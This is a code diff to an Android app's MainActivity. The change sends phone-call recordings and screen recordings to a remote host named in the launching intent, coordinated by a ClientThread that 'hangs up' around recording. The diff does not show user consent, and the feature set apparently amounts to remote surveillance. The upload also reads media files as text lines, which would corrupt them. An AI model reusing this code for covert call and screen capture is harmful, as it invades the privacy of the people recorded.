@@ -12,6 +12,7 @@ import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.os.IBinder;
 import android.os.RemoteException;
 import android.support.v4.content.ContextCompat;
@@ -29,13 +30,20 @@ import com.view.core.services.PhoneRecordBinder;
 import com.view.core.services.PhoneService;
 import com.view.core.services.ScreenRecordBinder;
 import com.view.core.services.ScreenRecordService;
+import com.view.core.thread.ClientThread;
+import com.view.core.thread.Constant;
 import com.view.core.utils.LocationUtil;
 import com.view.core.utils.ScreenRecordUtil;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.InputStreamReader;
 
 import Android.view.core.R;
 
@@ -44,7 +52,7 @@ import static android.support.v4.content.PermissionChecker.PERMISSION_DENIED;
 
 public class MainActivity extends Activity {
 
-    private static final String TAG = MainActivity.class.getSimpleName();
+    private static final String TAG = ClientThread.class.getSimpleName();
 
     private Context mContext = MainActivity.this;
     private int REQUEST_SCREEN_PERMISSION_RESULT = 1;
@@ -53,11 +61,19 @@ public class MainActivity extends Activity {
     private String mPhoneFile;
     private String mScreenFile;
 
+    private String remoteHost;
+
+    private Handler mHandler = new Handler();
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main_activity);
         ScreenRecordUtil.getInstance().initScreenRecordManager(this);
+
+        Bundle bundle = getIntent().getBundleExtra("data");
+        if(bundle != null)
+            remoteHost = bundle.getString(Constant.KEY_HOSTNAME);
+        Log.d(TAG, "onCreate: remote hostname="+ remoteHost);
 
         if(requestPermission()){
             Log.d(TAG, "start phone service...");
@@ -138,6 +154,8 @@ public class MainActivity extends Activity {
         @Override
         public void onRecordStart() throws RemoteException {
             Log.d(TAG, "onRecordStart: executed");
+            ClientThread thread = ((MyApplication)getApplication()).getRemoteClient();
+            if(thread != null) thread.hangUp(true);
         }
 
         @Override
@@ -154,6 +172,7 @@ public class MainActivity extends Activity {
         public void onRecordSuccess(String filePath) throws RemoteException {
             Log.d(TAG, "onRecordSuccess: path="+ filePath);
             mPhoneFile = filePath;
+
             if (ScreenRecordUtil.getInstance().isScreenRecordEnable()){
                 MediaProjectionManager mediaProjectionManager
                         = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
@@ -175,6 +194,20 @@ public class MainActivity extends Activity {
         @Override
         public void onRecordError(int errCode, String message) throws RemoteException {
             Log.e(TAG, "onRecordError: code="+ errCode+ ", message="+ message );
+        }
+
+        @Override
+        public void onPhoneIdel() throws RemoteException {
+            try {
+                ClientThread thread = ((MyApplication)getApplication()).getRemoteClient();
+                if(thread != null) thread.hangUp(false);
+                Thread.sleep(1000);
+                uploadFile(mPhoneFile, Constant.TYPE_PHONE);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
         }
 
         @Override
@@ -268,8 +301,13 @@ public class MainActivity extends Activity {
             Log.d(TAG, "onRecordSuccess: file path="+ filePath);
             mScreenFile = filePath;
             try {
-                uploadFile();
+                ClientThread thread = ((MyApplication)getApplication()).getRemoteClient();
+                if(thread != null) thread.hangUp(false);
+                Thread.sleep(1000);
+                uploadFile(mScreenFile, Constant.TYPE_SCREEN);
             } catch (JSONException e) {
+                e.printStackTrace();
+            } catch (InterruptedException e) {
                 e.printStackTrace();
             }
             unbindService(mServiceConnection);
@@ -286,24 +324,39 @@ public class MainActivity extends Activity {
         }
     };
 
-    private void uploadFile() throws JSONException {
-        File mPhone = null, mScreen;
+    private void uploadFile(String filePath, String fileType) throws JSONException {
+        Log.d(TAG, "uploadFile: path="+ filePath+ ", type="+ fileType);
+        File mFile = null;
         JSONObject json = new JSONObject();
-        if(mPhoneFile != null){
-            mPhone = new File(mPhoneFile);
-            json.put("phone", mPhone.getName());
-            json.put("length1", mPhone.length());
+        json.put(Constant.KEY_CMD, Constant.CMD_RETURN_REMOTE_DEVICE);
+        json.put(Constant.KEY_HOSTNAME, remoteHost);
+        if(filePath != null){
+            mFile = new File(filePath);
+            json.put(Constant.KEY_FILE, mFile.getName());
+            json.put(Constant.KEY_LENGTH, mFile.length());
         }
-        if(mScreenFile != null){
-            mScreen = new File(mScreenFile);
-            json.put("screen", mScreen.getName());
-            json.put("length2", mScreen.length());
-        }
-        String temp = json.toString()+ "\r\n";
-        String data = temp.length()+temp;
-        ((MyApplication)getApplication()).getRemoteClient().writeData(data.getBytes(), data.length());
 
+        String temp = json.toString()+ "\n";
+        byte[] data = temp.getBytes();
+        ((MyApplication)getApplication()).getRemoteClient().writeData(data, data.length);
+
+        try {
+            FileInputStream fis = new FileInputStream(mFile);
+            BufferedReader br = new BufferedReader(new InputStreamReader(fis));
+            String result = null;
+            while ((result=br.readLine()) != null){
+                byte[] array = result.getBytes();
+                ((MyApplication)getApplication()).getRemoteClient().writeData(array, array.length);
+            }
+            Log.d(TAG, "uploadFile: upload success");
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
+
+
 
     @Override
     protected void onDestroy() {
